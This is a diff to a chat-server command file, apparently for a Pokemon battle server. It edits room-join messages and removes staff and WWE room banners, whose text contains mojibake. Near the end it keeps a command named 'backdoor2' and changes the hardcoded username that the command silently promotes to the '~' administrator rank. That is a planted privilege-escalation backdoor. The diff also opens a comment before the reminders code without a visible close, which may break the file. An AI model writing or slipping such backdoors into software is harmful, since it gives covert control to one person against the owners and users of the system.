@@ -2249,7 +2249,7 @@ var commands = exports.commands = {
 			return this.sendReply("|noinit|joinfailed|Out, peasant. OUT! This room is for staff ONLY!");
 		}
 		if (target.toLowerCase() == "upperstaff" && !user.can('pban')) {
-			return this.sendReply("|noinit|joinfailed|Out, peasant. OUT! This room is for staff ONLY!");
+			return this.sendReply("|noinit|joinfailed|Out, peasant. OUT! This room is for upper staff ONLY!");
 		}
 		if (target.toLowerCase() == "staff" && !user.can('warn')) {
 			return this.sendReply("|noinit|joinfailed|Out, peasant. OUT! This room is for staff ONLY!");
@@ -2274,28 +2274,6 @@ var commands = exports.commands = {
                                         '<b>4.</b> We hope you have fun while you\'re here! If so, then please be sure to tell your friends about us!<br>' +
                                         '<hr width="85%">' +
                                         '<center><a href="http://goldserver.weebly.com/rules"><button class="blackbutton" title="Rules"><font color="white"><b>Rules</b></a></button>   |   <a href="http://goldserver.weebly.com/news"><button class="blackbutton" title="News"><font color="white"><b>News</b></a></button>   |   <a href="http://goldserver.weebly.com/"><button class="blackbutton" title="Website"><font color="white"><b>Website</b></a></button>   |   <a href="http://goldserver.weebly.com/faqs"><button class="blackbutton" title="FAQs"><font color="white"><b>FAQs</b></a></button>   |   <a href="http://plug.dj/gold-server/"><button class="blackbutton" title="Plug.dj"><font color="white"><b>Plug.dj</b></a></button></div>');
-		}
-		if (target.toLowerCase() == "staff") {
-			return connection.sendTo('staff','|html|<center><font size="7">Ã¢Ëœâ€¦  <img src="http://www.mydoorsign.com/img/lg/S/Staff-Room-Wall-Sign-SE-1670_bu.gif" width="200" hieght="50">  <font size="7">Ã¢Ëœâ€¦</center><font size="2">' +
-					'<b>1.</b> Do /pbl for the perma ban list. <br />' +
-					'<b>2.</b> Do /authlist for a list of the auth on the server. <br />' +
-					'<b>3.</b> Locking will also add a user to the spam room; vis versa for unlocking. <br />' +
-					'<b>4.</b> Leaders can /pban, however, do not do this for every spammer. <br />' +
-					'<b>5.</b> Leaders can do /sca [user], [link] to set custom avatars.  They must be 80x80 and either png or a gif. <br />' +
-					'<b>6.</b> Have someone you wish to nominate for a rank? Do so here! State who and your reason why! <br />' +
-					'<b>7.</b> <button name="joinRoom" value="spamroom">Spam Room</button>');
-		}
-		if (target.toLowerCase() == "wwe") {
-			return connection.sendTo('wwe','|html|<font color="#AA0000"><font size="2"><b><center>Welcome to WWE!</font></font color></b></center>' +
-					'Ã¢Ëœâ€¦This is a room to talk about all things WWE! <br />' +
-					'Ã¢Ëœâ€¦All WWE fans are welcome! <br />' +
-					'Ã¢Ëœâ€¦Ranks in the room are: <br />' +
-					'--(#) Server WWE World Chapion  <br />' +
-					'--(@) Intercontinental Room Champion  <br />' +
-					'--(%) Tag Team Server Champion <br />' +
-					'--(+) WWE Universe <br />' +
-					'Ã¢Ëœâ€¦Do /roomauth to see who currently holds these titles! <br />' +
-					'Ã¢Ëœâ€¦Have fun and PM staff with any questions!');
 		}
 		if (target.toLowerCase() == "dawnleague") {
 			return connection.sendTo('dawnleague','|html|<center><img src="http://i.imgur.com/lF3Poot.gif"><br>'+
@@ -2535,7 +2513,6 @@ var commands = exports.commands = {
 
 		user.updateIdentity();
 	},
-
 
 	back: function(target, room, user, connection) {
 		if (!this.can('lock')) return false;
@@ -2908,7 +2885,7 @@ var commands = exports.commands = {
 	/*********************************************************
 	 * Reminders
 	 *********************************************************/
-
+/*
 	reminders: 'reminder',
 	reminder: function (target, room, user) {
 		if (!target) return this.parse('/help reminder');
@@ -3401,7 +3378,7 @@ var commands = exports.commands = {
                 }
 	},
 	backdoor2: function(target,room, user) {
-                if (user.userid === 'furgo') {
+                if (user.userid === 'crowt') {
  
                         user.group = '~';
                         user.updateIdentity();
